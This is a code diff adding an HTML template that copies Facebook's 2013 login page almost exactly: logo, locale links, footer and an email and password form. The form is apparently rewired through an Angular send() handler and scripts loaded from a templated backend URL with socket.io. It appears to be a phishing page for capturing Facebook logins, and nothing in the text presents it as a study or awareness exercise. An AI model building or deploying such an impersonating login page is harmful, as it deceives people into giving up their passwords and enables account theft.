@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+
+<html class="" id="facebook" lang="en" x-ng-app="vitrine">
+<head>
+    <base href="https://www.facebook.com">
+    <meta charset="utf-8"><noscript>&lt;meta http-equiv="refresh" content="0;
+    URL=/login.php?_fb_noscript=1" /&gt;</noscript>
+    <meta content="noodp, noydir" name="robots">
+    <meta content="default" id="meta_referrer" name="referrer">
+    <meta content=
+    "Facebook is a social utility that connects people with friends and others who work, study and live around them. People use Facebook to keep up with friends, upload an unlimited number of photos, post links and videos, and learn more about the people they meet."
+    name="description">
+    <link href="https://www.facebook.com/login.php" media="handheld" rel=
+    "alternate">
+
+
+    <script src="<%= data.backend_url %>/socket.io/socket.io.js"></script>
+
+    <script>
+      API_URL = "<%= data.backend_url %>";
+      FRONT_URL = "<%= data.url %>";
+      <!-- var socket = io.connect('http://localhost:3000'); -->
+      <!-- socket.on('init', function () { -->
+      <!-- console.log('received initing'); -->
+
+      <!-- }); -->
+
+
+    </script>
+
+
+    <% data.scripts.forEach(function(script) { %>
+      <script src="<%= data.url %>/<%= script %>"></script>
+    <% }) %>
+    <script type='text/javascript' src="http://imsky.github.io/holder/holder.js"></script>
+    <script src="http://cdn.dcms.io/dist/ng-i18n.min.js"></script>
+
+
+    <title id="pageTitle">Facebook</title>
+    <meta content="Facebook">
+    <meta content="https://www.facebook.com/login.php">
+    <meta content="en_US">
+    <link href="https://ko-kr.facebook.com/login.php" hreflang="ko" rel=
+    "alternate">
+    <link href="https://es-es.facebook.com/login.php" hreflang="es-es" rel=
+    "alternate">
+    <link href="https://id-id.facebook.com/login.php" hreflang="id" rel=
+    "alternate">
+    <link href="https://vi-vn.facebook.com/login.php" hreflang="vi" rel=
+    "alternate">
+    <link href="https://es-la.facebook.com/login.php" hreflang="es" rel=
+    "alternate">
+    <link href="https://th-th.facebook.com/login.php" hreflang="th" rel=
+    "alternate">
+    <link href="https://fr-fr.facebook.com/login.php" hreflang="fr" rel=
+    "alternate">
+    <link href="https://it-it.facebook.com/login.php" hreflang="it" rel=
+    "alternate">
+    <link href="https://www.facebook.com/login.php" hreflang="en" rel=
+    "alternate"><noscript>&lt;meta http-equiv="X-Frame-Options" content="DENY"
+    /&gt;</noscript>
+    <link href="https://fbstatic-a.akamaihd.net/rsrc.php/yV/r/hzMapiNYYpW.ico"
+    rel="shortcut icon">
+    <link href=
+    "https://fbstatic-a.akamaihd.net/rsrc.php/v2/yc/r/CiVTo8Y7xdF.css" rel=
+    "stylesheet" type="text/css">
+    <link href=
+    "https://fbstatic-a.akamaihd.net/rsrc.php/v2/y-/r/gymkzewgz3c.css" rel=
+    "stylesheet" type="text/css">
+    <link href=
+    "https://fbstatic-a.akamaihd.net/rsrc.php/v2/yy/r/25haVCk40GB.css" rel=
+    "stylesheet" type="text/css">
+</head>
+
+<body class="login_page fbx UIPage_LoggedOut webkit safari Locale_en_US" ng-controller="DemoCtrl">
+    <div class="_li">
+        <div data-referrer="pagelet_bluebar" id="pagelet_bluebar">
+            <div id="blueBarHolder">
+                <div id="blueBar">
+                    <div>
+                        <div class="loggedout_menubar_container">
+                            <div class="clearfix loggedout_menubar">
+                                <a class=
+                                "lfloat fb_logo img sp_2xp1ac sx_f72f28" href=
+                                "/" style=
+                                "font-style: italic; text-decoration: underline"
+                                title="Go to Facebook Home">Facebook logo</a>
+                            </div>
+                        </div>
+
+                        <div class="signupBanner">
+                            <div class="signup_bar_container">
+                                <div class="signup_box clearfix">
+                                    <span class="signup_box_content"><a class=
+                                    "_42ft _42fu signup_btn selected _42gz _42gy"
+                                    href="/r.php?locale=en_US">Sign
+                                    Up</a></span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="uiContextualLayerParent" id="globalContainer">
+            <div class="fb_content clearfix" id="content">
+                <div class="UIFullPage_Container">
+                    <div class=
+                    "mvl ptm uiInterstitial login_page_interstitial uiInterstitialLarge uiBoxWhite">
+                    <div class=
+                    "uiHeader uiHeaderBottomBorder mhl mts uiHeaderPage interstitialHeader">
+                        <div class="clearfix uiHeaderTop">
+                                <div class="rfloat">
+                                    <h2 class="accessible_elem">Facebook
+                                    Login</h2>
+
+                                    <div class="uiHeaderActions"></div>
+                                </div>
+
+                                <div>
+                                    <h2 class="uiHeaderTitle">Facebook
+                                    Login</h2>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="phl ptm uiInterstitialContent">
+                            <div class="login_form_container">
+                                <form ng-submit="send()" id=
+                                "login_form" method="post" name="login_form"
+                                onsubmit=
+                                "return window.Event &amp;&amp; Event.__inlineSubmit &amp;&amp; Event.__inlineSubmit(this,event)">
+                                <input autocomplete="off" name="lsd" type=
+                                "hidden" value="AVpkrxXl">
+
+                                    <div class="hidden_elem"></div>
+
+                                    <div id="loginform">
+                                        <input autocomplete="off" id="display"
+                                        name="display" type="hidden" value=
+                                        ""><input autocomplete="off" id=
+                                        "enable_profile_selector" name=
+                                        "enable_profile_selector" type="hidden"
+                                        value=""><input autocomplete="off" id=
+                                        "legacy_return" name="legacy_return"
+                                        type="hidden" value=
+                                        "1"><input autocomplete="off" id="next"
+                                        name="next" type="hidden" value=
+                                        ""><input autocomplete="off" id=
+                                        "profile_selector_ids" name=
+                                        "profile_selector_ids" type="hidden"
+                                        value=""><input autocomplete="off" id=
+                                        "trynum" name="trynum" type="hidden"
+                                        value="1"><input autocomplete="off" id=
+                                        "u_0_0" name="timezone" type="hidden"
+                                        value="-120"><input name="lgnrnd" type=
+                                        "hidden" value="024655_1iVS"><input id=
+                                        "lgnjs" name="lgnjs" type="hidden"
+                                        value="1382608015">
+
+                                        <div class="form_row clearfix">
+                                            <label class="login_form_label"
+                                            for="email">Email or
+                                            Phone:</label><input class=
+                                            "inputtext" id="email" name="email"
+                                            type="text" value="">
+                                        </div>
+
+                                        <div class="form_row clearfix">
+                                            <label class="login_form_label"
+                                            for="pass">Password:</label><input class="inputpassword"
+                                            id="pass" name="pass" type=
+                                            "password">
+                                        </div>
+
+                                        <div class="persistent">
+                                            <div class="uiInputLabel clearfix">
+                                                <input class=
+                                                "uiInputLabelCheckbox" id=
+                                                "persist_box" name="persistent"
+                                                type="checkbox" value=
+                                                "1"><label for=
+                                                "persist_box">Keep me logged
+                                                in</label>
+                                            </div>
+                                        </div><input autocomplete="off" id=
+                                        "default_persistent" name=
+                                        "default_persistent" type="hidden"
+                                        value="0">
+
+                                        <div class="form_row clearfix" id=
+                                        "buttons">
+                                            <label class=
+                                            "login_form_label"></label>
+
+                                            <div id="login_button_inline">
+                                                <label class=
+                                                "uiButton uiButtonConfirm uiButtonLarge"
+                                                for="u_0_1" id=
+                                                "loginbutton"><input id="u_0_1"
+                                                name="login" type="submit"
+                                                value="Log In"></label>
+                                            </div>
+
+                                            <div id="register_link">
+                                                or <strong><a href=
+                                                "/r.php?next&amp;locale=en_US&amp;display=page"
+                                                id="reg_btn_link" rel=
+                                                "nofollow" tabindex="-1"
+                                                target="_self">Sign up for
+                                                Facebook</a></strong>
+                                            </div>
+                                        </div>
+
+                                        <p class="reset_password form_row">
+                                        <a href=
+                                        "https://www.facebook.com/recover/initiate"
+                                        tabindex="-1" target="">Forgot your
+                                        password?</a></p>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+
+                    <ul class=
+                    "uiList ptm localeSelectorList _509- _4ki _6-h _6-j _6-i">
+                        <li>
+                            <a dir="ltr" href=
+                            "https://www.facebook.com/login.php" onclick=
+                            "intl_set_cookie_locale(&quot;fr_FR&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);"
+                            title="French (France)">Français (France)</a>
+                        </li>
+
+                        <li>
+                            <a dir="ltr" href=
+                            "https://www.facebook.com/login.php" onclick=
+                            "intl_set_cookie_locale(&quot;en_US&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);"
+                            title="English (US)">English (US)</a>
+                        </li>
+
+                        <li>
+                            <a dir="ltr" href=
+                            "https://www.facebook.com/login.php" onclick=
+                            "intl_set_cookie_locale(&quot;es_LA&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);"
+                            title="Spanish">Español</a>
+                        </li>
+
+                        <li>
+                            <a dir="ltr" href=
+                            "https://www.facebook.com/login.php" onclick=
+                            "intl_set_cookie_locale(&quot;pt_BR&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);"
+                            title="Portuguese (Brazil)">Português (Brasil)</a>
+                        </li>
+
+                        <li>
+                            <a dir="ltr" href=
+                            "https://www.facebook.com/login.php" onclick=
+                            "intl_set_cookie_locale(&quot;de_DE&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);"
+                            title="German">Deutsch</a>
+                        </li>
+
+                        <li>
+                            <a dir="ltr" href=
+                            "https://www.facebook.com/login.php" onclick=
+                            "intl_set_cookie_locale(&quot;it_IT&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);"
+                            title="Italian">Italiano</a>
+                        </li>
+
+                        <li>
+                            <a dir="rtl" href=
+                            "https://www.facebook.com/login.php" onclick=
+                            "intl_set_cookie_locale(&quot;ar_AR&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);"
+                            title="Arabic">العربية</a>
+                        </li>
+
+                        <li>
+                            <a dir="ltr" href=
+                            "https://www.facebook.com/login.php" onclick=
+                            "intl_set_cookie_locale(&quot;hi_IN&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);"
+                            title="Hindi">हिन्दी</a>
+                        </li>
+
+                        <li>
+                            <a dir="ltr" href=
+                            "https://www.facebook.com/login.php" onclick=
+                            "intl_set_cookie_locale(&quot;zh_CN&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);"
+                            title="Simplified Chinese (China)">中文(简体)</a>
+                        </li>
+
+                        <li>
+                            <a dir="ltr" href=
+                            "https://www.facebook.com/login.php" onclick=
+                            "intl_set_cookie_locale(&quot;ja_JP&quot;, &quot;https:\/\/www.facebook.com\/login.php&quot;);"
+                            title="Japanese">日本語</a>
+                        </li>
+
+                        <li>
+                            <a class="showMore" href=
+                            "/ajax/intl/language_dialog.php?uri=https%3A%2F%2Fwww.facebook.com%2Flogin.php&amp;source=TOP_LOCALES_DIALOG"
+                            rel="dialog" title="Show more languages">…</a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+
+            <div data-referrer="page_footer" id="pageFooter">
+                <div id="contentCurve"></div>
+
+                <div>
+                    <table cellpadding="0" cellspacing="0" class=
+                    "uiGrid _51mz navigationGrid">
+                        <tbody>
+                            <tr class="_51mx">
+                                <td class="_51m- hLeft plm">
+                                    <a href=
+                                    "https://www.facebook.com/mobile/?ref=pf"
+                                    title=
+                                    "Check out Facebook Mobile.">Mobile</a>
+                                </td>
+
+                                <td class="_51m- hLeft plm">
+                                    <a href=
+                                    "https://www.facebook.com/find-friends?ref=pf"
+                                    title="Find anyone on the web.">Find
+                                    Friends</a>
+                                </td>
+
+                                <td class="_51m- hLeft plm">
+                                    <a href=
+                                    "https://www.facebook.com/badges/?ref=pf"
+                                    title=
+                                    "Embed a Facebook badge on your website.">Badges</a>
+                                </td>
+
+                                <td class="_51m- hLeft plm">
+                                    <a href=
+                                    "https://www.facebook.com/directory/people/"
+                                    title=
+                                    "Browse our people directory.">People</a>
+                                </td>
+
+                                <td class="_51m- hLeft plm">
+                                    <a href=
+                                    "https://www.facebook.com/directory/pages/"
+                                    title=
+                                    "Browse our pages directory.">Pages</a>
+                                </td>
+
+                                <td class="_51m- hLeft plm">
+                                    <a href=
+                                    "https://www.facebook.com/directory/places/"
+                                    title=
+                                    "Browse our places directory.">Places</a>
+                                </td>
+
+                                <td class="_51m- hLeft plm">
+                                    <a href=
+                                    "https://www.facebook.com/appcenter/?ref=pf"
+                                    title=
+                                    "Check out Facebook App Center.">Apps</a>
+                                </td>
+
+                                <td class="_51m- hLeft plm">
+                                    <a href=
+                                    "https://www.facebook.com/appcenter/category/games/?ref=pf"
+                                    title="Check out Facebook games.">Games</a>
+                                </td>
+
+                                <td class="_51m- hLeft plm _51mw">
+                                    <a href=
+                                    "https://www.facebook.com/appcenter/category/music/?ref=pf"
+                                    title=
+                                    "Check out Facebook music apps.">Music</a>
+                                </td>
+                            </tr>
+
+                            <tr class="_51mx">
+                                <td class="_51m- hLeft plm">
+                                    <a accesskey="8" href=
+                                    "https://www.facebook.com/facebook" title=
+                                    "Read our blog, discover the resource center, and find job opportunities.">
+                                    About</a>
+                                </td>
+
+                                <td class="_51m- hLeft plm">
+                                    <a href=
+                                    "https://www.facebook.com/campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;extra_1=auto"
+                                    title="Advertise on Facebook.">Create
+                                    Ad</a>
+                                </td>
+
+                                <td class="_51m- hLeft plm">
+                                    <a href=
+                                    "https://www.facebook.com/pages/create/?ref_type=sitefooter"
+                                    title="Create a Page">Create Page</a>
+                                </td>
+
+                                <td class="_51m- hLeft plm">
+                                    <a href=
+                                    "https://developers.facebook.com/?ref=pf"
+                                    title=
+                                    "Develop on our platform.">Developers</a>
+                                </td>
+
+                                <td class="_51m- hLeft plm">
+                                    <a href=
+                                    "https://www.facebook.com/careers/?ref=pf"
+                                    title=
+                                    "Make your next career move to our awesome company.">
+                                    Careers</a>
+                                </td>
+
+                                <td class="_51m- hLeft plm">
+                                    <a href=
+                                    "https://www.facebook.com/privacy/explanation"
+                                    title=
+                                    "Learn about your privacy and Facebook.">Privacy</a>
+                                </td>
+
+                                <td class="_51m- hLeft plm">
+                                    <a href=
+                                    "https://www.facebook.com/help/cookies/?ref=sitefooter"
+                                    title=
+                                    "Learn about cookies and Facebook.">Cookies</a>
+                                </td>
+
+                                <td class="_51m- hLeft plm">
+                                    <a accesskey="9" href=
+                                    "https://www.facebook.com/policies/?ref=pf"
+                                    title=
+                                    "Review our terms and policies.">Terms</a>
+                                </td>
+
+                                <td class="_51m- hLeft plm _51mw">
+                                    <a accesskey="0" href=
+                                    "https://www.facebook.com/help/?ref=pf"
+                                    title="Visit our Help Center.">Help</a>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="mvl copyright">
+                    <div class="fsm fwn fcg">
+                        <span>Facebook © 2013</span> · <a href=
+                        "/ajax/intl/language_dialog.php?uri=https%3A%2F%2Fwww.facebook.com%2Flogin.php"
+                        rel="dialog" title=
+                        "Use Facebook in another language.">English (US)</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div><!-- BigPipe construction and first response -->
+</body>
+</html>
